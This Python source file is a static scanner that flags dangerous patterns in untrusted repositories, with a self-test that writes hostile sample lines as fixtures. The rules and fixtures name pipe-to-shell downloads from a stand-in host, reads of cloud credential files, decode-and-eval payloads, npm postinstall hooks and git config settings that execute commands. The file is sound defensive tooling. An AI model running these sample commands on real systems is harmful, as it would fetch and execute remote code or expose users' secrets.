"""sniff: flag what an untrusted repo (e.g. a take-home assignment) would do, BEFORE you run it.

Static and read-only: it never executes, imports, or installs anything from the target.
Run: python3 sniff.py <path>     Self-check: python3 sniff.py --test
Exit code 1 if any HIGH finding, so it can gate CI.
"""
import json
import os
import re
import sys
import tempfile
import unicodedata

# (id, severity, why it matters, regex). Matched line by line against every text file.
# ponytail: regex heuristics only; add AST parsing when false positives get annoying.
RULES = [
    ("pipe-to-shell", "HIGH", "downloads and runs code in one step",
     r"(curl|wget)\b[^\n|]*\|\s*(sudo\s+)?(ba|z)?sh\b"),
    ("shell-profile", "HIGH", "edits shell startup files (persistence, PATH hijack)",
     r"\.(zshrc|bashrc|bash_profile|zprofile|zshenv)\b"),
    ("toolchain-shim", "HIGH", "touches pyenv/nvm/rbenv shims (the pyenv swap trick)",
     r"\.pyenv|/shims/|\.nvm/|\.rbenv|\.asdf/"),
    ("persistence", "HIGH", "installs something that survives reboot",
     r"LaunchAgents|LaunchDaemons|crontab\s|systemctl\s+enable"),
    ("credential-path", "HIGH", "reads secrets: SSH keys, cloud, kube, docker, keychain",
     r"\.ssh/|\.aws/credentials|\.kube/config|\.docker/config\.json|Keychains|\.netrc|\.npmrc"),
    ("decode-exec", "MEDIUM", "decodes hidden data (common obfuscation)",
     r"base64\s+(-d|--decode)|b64decode\(|atob\(|Buffer\.from\([^)]*base64|fromhex\("),
    ("dynamic-exec", "MEDIUM", "runs code built at runtime",
     r"\b(exec|eval)\s*\(\s*(compile|.*decode|.*decompress|.*join)"),
    ("long-blob", "MEDIUM", "long encoded blob hidden in source",
     r"[A-Za-z0-9+/]{300,}={0,2}"),
    ("hidden-unicode", "HIGH", "bidirectional control characters (Trojan Source)",
     "[\u202a-\u202e\u2066-\u2069]"),
]
COMPILED = [(i, s, w, re.compile(r)) for i, s, w, r in RULES]
NPM_HOOKS = {"preinstall", "install", "postinstall", "prepare", "prepublish"}
SKIP_DIRS = {".git", "node_modules", ".venv", "venv", "__pycache__"}
BINARY_MAGIC = {b"\x7fELF": "ELF", b"\xcf\xfa\xed\xfe": "Mach-O", b"\xca\xfe\xba\xbe": "Mach-O fat",
                b"MZ": "Windows PE"}
MAX_BYTES = 2_000_000
# Skip a binary only when its real header matches its extension, so `evil.png` full of script still gets scanned.
MEDIA_MAGIC = {".png": b"\x89PNG", ".jpg": b"\xff\xd8\xff", ".jpeg": b"\xff\xd8\xff", ".gif": b"GIF8",
               ".pdf": b"%PDF", ".ico": b"\x00\x00\x01\x00", ".webp": b"RIFF", ".woff": b"wOFF",
               ".woff2": b"wOF2", ".ttf": b"\x00\x01\x00\x00", ".DS_Store": b"\x00\x00\x00\x01Bud1"}
# Fail closed on git config: a fresh clone only has these keys. Anything else (fsmonitor, hooksPath,
# aliases, filters, includes, odd syntax, continuations) gets flagged, so parser tricks can't hide it.
SAFE_GIT = {"core": {"repositoryformatversion", "filemode", "bare", "logallrefupdates", "ignorecase",
                    "precomposeunicode", "symlinks"},
            "remote": {"url", "fetch"}, "branch": {"remote", "merge"}, "user": {"name", "email"}}
GIT_HEADER = re.compile(r'\s*\[([A-Za-z0-9.-]+)(\s+"[^"\\]*")?\]\s*')
GIT_ENTRY = re.compile(r"\s*([A-Za-z][A-Za-z0-9-]*)\s*=\s*([^\\]*)")
GIT_SKIP = re.compile(r"\s*([#;].*)?")


def clean(s):
    """Escape control/format chars so attacker-chosen names can't rewrite the terminal."""
    return "".join(c.encode("unicode_escape").decode() if unicodedata.category(c) in ("Cc", "Cf") else c
                   for c in s)


def scan_text(rel, text):
    out = []
    for n, line in enumerate(text.split("\n"), 1):
        for rid, sev, why, rx in COMPILED:
            if rx.search(line):
                out.append((sev, rid, f"{rel}:{n}", why))
    return out


def scan_file(root, path):
    rel = os.path.relpath(path, root)
    try:
        if os.path.getsize(path) > MAX_BYTES:
            return [("HIGH", "large-file", rel, "too big to scan; inspect by hand")]  # fail closed
        with open(path, "rb") as f:
            data = f.read()
    except OSError:
        return []
    for magic, kind in BINARY_MAGIC.items():
        if data.startswith(magic):
            return [("HIGH", "binary", rel, f"prebuilt {kind} executable; you can't read what it does")]
    out = []
    if b"\0" in data[:4096]:
        name = os.path.basename(path)
        magic = MEDIA_MAGIC.get(name if name == ".DS_Store" else os.path.splitext(name)[1].lower())
        if magic and data.startswith(magic):
            return []
        out.append(("MEDIUM", "opaque-file", rel, "binary data of unknown type; strings scanned anyway"))
    text = data.decode("utf-8", errors="ignore")
    out += scan_text(rel, text)
    name = os.path.basename(path)
    if name == "package.json":
        try:
            scripts = json.loads(text).get("scripts", {}) or {}
        except (ValueError, AttributeError):
            scripts = {}
        for hook in NPM_HOOKS & set(scripts):
            out.append(("HIGH", "npm-install-hook", rel, f"runs on npm install: {scripts[hook]!r}"))
    if name == "setup.py":
        out.append(("MEDIUM", "setup-py", rel, "arbitrary code runs on pip install"))
    return out


def scan_git_config(rel, text):
    """Flag every line of a shipped git config that isn't a plain header, comment, or known-safe key."""
    out, section = [], ""
    for n, line in enumerate(text.split("\n"), 1):
        if GIT_SKIP.fullmatch(line):
            continue
        if (h := GIT_HEADER.fullmatch(line)):
            section = h.group(1).lower()
            continue
        m = GIT_ENTRY.fullmatch(line)
        # exact (section, key) pairs only; ext:: URLs make git run a command
        if not (m and m.group(1).lower() in SAFE_GIT.get(section, ()) and "ext::" not in m.group(2)):
            out.append(("HIGH", "git-config-exec", f"{rel}:{n}", f"unexpected git setting, may run code: {line.strip()!r}"))
    return out


def scan_git(root, gitpath):
    rel = os.path.relpath(gitpath, root)
    if os.path.isfile(gitpath):  # `gitdir: <elsewhere>` pointer: hooks/config live outside what we can see
        return [("HIGH", "git-pointer", rel, "points git at a directory outside this repo; inspect by hand")]
    out = []
    hooks = os.path.join(gitpath, "hooks")
    if os.path.isdir(hooks):  # a shipped .git with live hooks runs on your next git command
        out += [("HIGH", "git-hook", f"{rel}/hooks/{h}", "runs automatically on git commands")
                for h in os.listdir(hooks) if not h.endswith(".sample")]
    for cfg in ("config", "config.worktree"):
        try:
            with open(os.path.join(gitpath, cfg), encoding="utf-8-sig", errors="ignore") as f:
                out += scan_git_config(f"{rel}/{cfg}", f.read())
        except OSError:
            pass
    return out


def scan(root):
    findings = []
    for dirpath, dirs, files in os.walk(root):
        if ".git" in dirs or ".git" in files:  # root repo and any nested one
            findings += scan_git(root, os.path.join(dirpath, ".git"))
        files = [f for f in files if f != ".git"]
        found = SKIP_DIRS & set(dirs)
        if "node_modules" in found:
            findings.append(("MEDIUM", "vendored-deps", os.path.relpath(os.path.join(dirpath, "node_modules"), root),
                             "ships its own dependencies; not scanned"))
        dirs[:] = [d for d in dirs if d not in SKIP_DIRS]
        for f in files:
            p = os.path.join(dirpath, f)
            if not os.path.islink(p):
                findings += scan_file(root, p)
    return sorted(findings, key=lambda x: (x[0] != "HIGH", x[2]))


def main(root):
    findings = scan(root)
    for sev, rid, where, why in findings:
        print(f"{sev:6} {rid:17} {clean(where)}  - {clean(why)}")
    high = sum(f[0] == "HIGH" for f in findings)
    print(f"\n{len(findings)} findings, {high} HIGH. "
          + ("Don't run this outside a sandbox." if high else "Nothing obvious; still run it in a sandbox."))
    return 1 if high else 0


def test():
    with tempfile.TemporaryDirectory() as d:
        files = {
            "install.sh": "curl -fsSL https://x.example/i.sh | bash\necho ok >> ~/.zshrc\n",
            "fix_env.py": "import shutil\nshutil.copy('p', os.path.expanduser('~/.pyenv/shims/python'))\n",
            "steal.js": "fs.readFileSync(home + '/.aws/credentials')\neval(atob(payload))\n",
            "package.json": json.dumps({"scripts": {"postinstall": "node steal.js", "test": "jest"}}),
            "clean.py": "print('hello world')\n",
            "tool": "\x7fELF rest",
            "straddle.sh": "curl -s https://x.example/p \x0c| sh\n",
            "blob.dat": "\0\0wget https://x.example/p | bash\n",
            "trojan.py": "access = 'user' # \u202e admin\n",
        }
        os.makedirs(os.path.join(d, ".git"))
        files[".git/config"] = ("\ufeff[core] fsmonitor = ./run.sh\n[user]\n\tname = x\n"
                                 "[alias]\n\tx = \\\n  \"!sh evil\"\n[include]\n\tp = 1\n[alias]\n\tname = !sh evil\n[remote \"o\"]\n\turl = ext::sh -c evil\n")
        os.makedirs(os.path.join(d, "sub"))
        files["sub/.git"] = "gitdir: /somewhere/else\n"
        files["fake.png"] = "\0\0curl https://x.example/p | sh\n"
        for name, body in files.items():
            with open(os.path.join(d, name), "w") as f:
                f.write(body)
        ids = {(f[1], f[2].split(":")[0]) for f in scan(d)}
        for expected in [("pipe-to-shell", "install.sh"), ("shell-profile", "install.sh"),
                         ("toolchain-shim", "fix_env.py"), ("credential-path", "steal.js"),
                         ("decode-exec", "steal.js"), ("npm-install-hook", "package.json"),
                         ("binary", "tool"), ("hidden-unicode", "trojan.py"),
                         ("pipe-to-shell", "straddle.sh"), ("pipe-to-shell", "blob.dat"),
                         ("git-config-exec", ".git/config"),
                         ("git-pointer", "sub/.git"), ("pipe-to-shell", "fake.png")]:
            assert expected in ids, (expected, ids)
        assert not any(where == "clean.py" for _, where in ids), ids
        assert not any(rid == "npm-install-hook" and "jest" in why for _, rid, _, why in scan(d))
        assert sum(f[1] == "git-config-exec" for f in scan(d)) == 6  # one-line, 2 continued, include, alias, ext:: url; not [user] name = x
    assert "\x1b" not in clean("evil\x1b[2J.sh") and "\\x1b" in clean("evil\x1b[2J.sh")
    print("ok")


if __name__ == "__main__":
    if "--test" in sys.argv:
        test()
    elif len(sys.argv) == 2:
        sys.exit(main(sys.argv[1]))
    else:
        sys.exit(__doc__)
